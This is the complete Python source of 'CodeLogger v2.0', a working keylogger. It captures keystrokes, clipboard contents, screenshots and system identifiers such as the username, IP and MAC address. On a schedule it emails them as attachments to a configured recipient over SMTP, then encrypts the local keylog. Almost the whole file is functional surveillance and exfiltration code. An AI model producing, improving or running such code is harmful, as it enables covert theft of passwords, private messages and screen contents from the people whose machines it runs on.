#!/usr/bin/env python3
import os
import sys
import time
import platform
import json
import socket
import uuid
import logging
import threading
import base64
import smtplib
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List

import psutil
import schedule
import pyautogui
import pyperclip
from pynput.keyboard import Key, Listener, KeyCode

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders

# ============================
# ASCII Banner Function
# ============================
def print_banner() -> None:
    banner = r"""
   _____          _      _                            
  / ____|        | |    | |                           
 | |     ___   __| | ___| |     ___   __ _  __ _  ___ _ __ 
 | |    / _ \ / _` |/ _ \ |    / _ \ / _` |/ _` |/ _ \ '__|
 | |___| (_) | (_| |  __/ |___| (_) | (_| | (_| |  __/ |   
  \_____\___/ \__,_|\___|______\___/ \__, |\__, |\___|_|   
                                       __/ | __/ |          
                                      |___/ |___/        v2.0
    """
    # Clear terminal (cross-platform)
    if platform.system() == "Windows":
        os.system('cls')
        os.system('color 0A')
    else:
        os.system('clear')
    
    print(banner)
    print("=" * 60)


# ============================
# Logger Class
# ============================
class Logger:
    """Simple logger using Python's logging module."""
    
    def __init__(self, log_file: str = "codelogger.log", level: int = logging.INFO) -> None:
        self.logger = logging.getLogger("CodeLogger")
        self.logger.setLevel(level)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')

        fh = logging.FileHandler(log_file)
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)

        sh = logging.StreamHandler()
        sh.setFormatter(formatter)
        self.logger.addHandler(sh)

    def info(self, message: str) -> None:
        self.logger.info(message)

    def error(self, message: str) -> None:
        self.logger.error(message)

    def debug(self, message: str) -> None:
        self.logger.debug(message)


# ============================
# Config Manager Class
# ============================
class ConfigManager:
    """Handles configuration loading and saving."""
    
    def __init__(self, config_file: str = "config.json") -> None:
        self.config_file = config_file
        self.config = {
            "keylog_file": "key.txt",
            "screenshot_dir": "screenshots",
            "clipboard_file": "clipboard_history.txt",
            "encryption": {
                "enabled": True,
                "password": "default_password",
                "salt": "default_salt"
            },
            "email": {
                "enabled": True,
                "server": "smtp.gmail.com",
                "port": 587,
                "user": "example@gmail.com",
                "password": "password",
                "recipient": "example@gmail.com"
            },
            "features": {
                "keylogging": True,
                "screenshots": True,
                "clipboard_monitoring": True,
                "system_info": True
            },
            "schedule": {
                "interval_minutes": 30,
                "keystroke_threshold": 10
            }
        }
        self.load_config()
    
    def load_config(self) -> None:
        """Load config settings from JSON file if exists."""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, "r") as f:
                    loaded = json.load(f)
                    self.config.update(loaded)
            except Exception as e:
                print(f"Error loading config: {e}")

    def save_config(self) -> None:
        """Save current config settings to JSON file."""
        try:
            with open(self.config_file, "w") as f:
                json.dump(self.config, f, indent=4)
        except Exception as e:
            print(f"Error saving config: {e}")
    
    def get(self, key: str, default: Any = None) -> Any:
        """Return configuration setting given a dotted key."""
        keys = key.split('.')
        value = self.config
        try:
            for k in keys:
                value = value[k]
            return value
        except KeyError:
            return default


# ============================
# Encryptor Class
# ============================
class Encryptor:
    """Handles file encryption and decryption."""
    
    def __init__(self, config: ConfigManager) -> None:
        self.config = config
        self.fernet = self._get_fernet()

    def _get_fernet(self) -> Fernet:
        password = self.config.get("encryption.password").encode()
        salt = self.config.get("encryption.salt").encode()
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return Fernet(key)

    def encrypt_file(self, file_path: str) -> bool:
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            enc_data = self.fernet.encrypt(data)
            with open(file_path, "wb") as f:
                f.write(enc_data)
            return True
        except Exception as e:
            print(f"Encryption error: {e}")
            return False

    def decrypt_file(self, file_path: str) -> bool:
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            dec_data = self.fernet.decrypt(data)
            with open(file_path, "wb") as f:
                f.write(dec_data)
            return True
        except Exception as e:
            print(f"Decryption error: {e}")
            return False


# ============================
# Email Reporter Class
# ============================
class EmailReporter:
    """Sends email reports with attachments."""
    
    def __init__(self, config: ConfigManager, logger: Logger) -> None:
        self.config = config
        self.logger = logger
    
    def send_report(self, subject: str, body: str, attachments: List[str] = []) -> bool:
        if not self.config.get("email.enabled", False):
            self.logger.info("Email reporting is disabled in config.")
            return False
        
        try:
            msg = MIMEMultipart()
            msg["Subject"] = subject
            msg["From"] = self.config.get("email.user")
            msg["To"] = self.config.get("email.recipient")
            msg.attach(MIMEText(body, "plain"))
            
            for attachment in attachments:
                if os.path.exists(attachment):
                    part = MIMEBase("application", "octet-stream")
                    with open(attachment, "rb") as f:
                        part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        "Content-Disposition", 
                        f"attachment; filename={os.path.basename(attachment)}"
                    )
                    msg.attach(part)
            
            server = smtplib.SMTP(self.config.get("email.server"), self.config.get("email.port"))
            server.starttls()
            server.login(self.config.get("email.user"), self.config.get("email.password"))
            server.sendmail(self.config.get("email.user"), self.config.get("email.recipient"), msg.as_string())
            server.quit()
            
            self.logger.info("Email sent successfully.")
            return True
        except Exception as e:
            self.logger.error(f"Failed to send email: {e}")
            return False


# ============================
# System Monitor Class
# ============================
class SystemMonitor:
    """Gathers and saves basic system information."""
    
    def __init__(self, logger: Logger) -> None:
        self.logger = logger
        self.info_dir = "system_info"
        os.makedirs(self.info_dir, exist_ok=True)
    
    def get_system_info(self) -> Dict[str, Any]:
        info = {
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "platform": platform.platform(),
            "processor": platform.processor(),
            "architecture": platform.architecture(),
            "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) 
                                      for i in range(0, 48, 8)][::-1]),
            "username": os.getlogin(),
            "cpu_count": psutil.cpu_count(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk": psutil.disk_usage('/')._asdict(),
            "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        }
        return info

    def save_system_info(self) -> str:
        info = self.get_system_info()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_path = os.path.join(self.info_dir, f"system_info_{timestamp}.json")
        try:
            with open(file_path, "w") as f:
                json.dump(info, f, indent=4)
            self.logger.info(f"System info saved to {file_path}")
            return file_path
        except Exception as e:
            self.logger.error(f"Error saving system info: {e}")
            return ""


# ============================
# Screenshot Capture Class
# ============================
class ScreenshotCapture:
    """Captures screenshots and saves them."""
    
    def __init__(self, config: ConfigManager, logger: Logger) -> None:
        self.config = config
        self.logger = logger
        self.screenshot_dir = self.config.get("screenshot_dir", "screenshots")
        os.makedirs(self.screenshot_dir, exist_ok=True)
    
    def capture(self) -> str:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_path = os.path.join(self.screenshot_dir, f"screenshot_{timestamp}.png")
        try:
            image = pyautogui.screenshot()
            image.save(file_path)
            self.logger.info(f"Screenshot saved to {file_path}")
            return file_path
        except Exception as e:
            self.logger.error(f"Screenshot error: {e}")
            return ""


# ============================
# Clipboard Monitor Class
# ============================
class ClipboardMonitor:
    """Monitors and logs clipboard content changes."""
    
    def __init__(self, config: ConfigManager, logger: Logger) -> None:
        self.config = config
        self.logger = logger
        self.clipboard_file = self.config.get("clipboard_file", "clipboard_history.txt")
        self.monitoring = False
        self.last_content = ""
    
    def start(self) -> None:
        self.monitoring = True
        thread = threading.Thread(target=self._monitor)
        thread.daemon = True
        thread.start()
        self.logger.info("Clipboard monitoring started.")
    
    def _monitor(self) -> None:
        while self.monitoring:
            try:
                content = pyperclip.paste()
                if content != self.last_content:
                    self.last_content = content
                    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
                    with open(self.clipboard_file, "a", encoding="utf-8") as f:
                        f.write(f"\n{timestamp} {content}\n")
            except Exception as e:
                self.logger.error(f"Clipboard error: {e}")
            time.sleep(1)


# ============================
# KeyLogger Class
# ============================
class KeyLogger:
    """Main keylogging functionality."""
    
    def __init__(self, config: ConfigManager, logger: Logger) -> None:
        self.config = config
        self.logger = logger
        self.keys: List[str] = []
        self.count = 0
        self.filename = self.config.get("keylog_file", "key.txt")
        self.threshold = self.config.get("schedule.keystroke_threshold", 10)
        self._ensure_unique_filename()
    
    def _ensure_unique_filename(self) -> None:
        base = Path(self.filename)
        while base.exists():
            self.count += 1
            self.filename = f"{base.stem}_{self.count}{base.suffix}"
            base = Path(self.filename)
    
    def write_keys(self, key: str) -> None:
        self.keys.append(key)
        if len(self.keys) >= self.threshold:
            with open(self.filename, "a") as f:
                for k in self.keys:
                    if "space" in k.lower():
                        f.write("\n")
                    elif "key" not in k.lower():
                        f.write(k)
                self.keys = []
    
    def on_press(self, key) -> None:
        try:
            self.write_keys(str(key).replace("'", ""))
        except Exception as e:
            self.logger.error(f"Error writing key: {e}")
    
    def on_release(self, key) -> bool:
        # Stop keylogger if Ctrl+Z or Command+Z (macOS) is pressed
        if hasattr(key, "vk"):
            if key == KeyCode.from_char("z") and (hasattr(key, "ctrl") and key.ctrl):
                self.logger.info("Stop key combination pressed. Exiting keylogger.")
                return False
            if platform.system() == "Darwin":
                # For macOS, check for Command+Z (using Key.cmd)
                if key == KeyCode.from_char("z") and hasattr(key, "cmd") and key.cmd:
                    self.logger.info("Stop key combination (Cmd+Z) pressed. Exiting keylogger.")
                    return False
        return True
    
    def start(self) -> None:
        self.logger.info("Keylogger started.")
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()


# ============================
# Scheduler Functionality
# ============================
def scheduled_tasks(keylogger: KeyLogger,
                    screenshot: ScreenshotCapture,
                    system_monitor: SystemMonitor,
                    email_reporter: EmailReporter,
                    encryptor: Encryptor,
                    logger: Logger,
                    config: ConfigManager) -> None:
    """
    Gather scheduled data (system info, screenshots) and send email reports.
    """
    attachments: List[str] = []
    
    if os.path.exists(keylogger.filename):
        attachments.append(keylogger.filename)
    
    if config.get("features.screenshots", True):
        screenshot_file = screenshot.capture()
        if screenshot_file:
            attachments.append(screenshot_file)
    
    if config.get("features.system_info", True):
        system_info_file = system_monitor.save_system_info()
        if system_info_file:
            attachments.append(system_info_file)
    
    subject = "Scheduled CodeLogger Report"
    body = f"Report generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    email_reporter.send_report(subject, body, attachments)
    
    if config.get("encryption.enabled", True):
        encryptor.encrypt_file(keylogger.filename)


# ============================
# Main Application Structure
# ============================
def main() -> None:
    print_banner()
    
    logger = Logger()
    logger.info("Starting CodeLogger 2.0 ...")
    
    config = ConfigManager()
    
    encryptor = Encryptor(config)
    email_reporter = EmailReporter(config, logger)
    system_monitor = SystemMonitor(logger)
    screenshot = ScreenshotCapture(config, logger)
    keylogger = KeyLogger(config, logger)
    clipboard_monitor = ClipboardMonitor(config, logger)
    
    if config.get("features.clipboard_monitoring", True):
        clipboard_monitor.start()
    
    interval = config.get("schedule.interval_minutes", 30)
    schedule.every(interval).minutes.do(scheduled_tasks, keylogger, screenshot, system_monitor,
                                          email_reporter, encryptor, logger, config)
    
    keylogger_thread = threading.Thread(target=keylogger.start)
    keylogger_thread.daemon = True
    keylogger_thread.start()
    
    logger.info(f"Reporting scheduled every {interval} minutes.")
    logger.info("Press Ctrl+C (or the configured key combination) to exit.")
    
    try:
        while True:
            schedule.run_pending()
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Exiting CodeLogger...")
        sys.exit(0)


if __name__ == "__main__":
    main()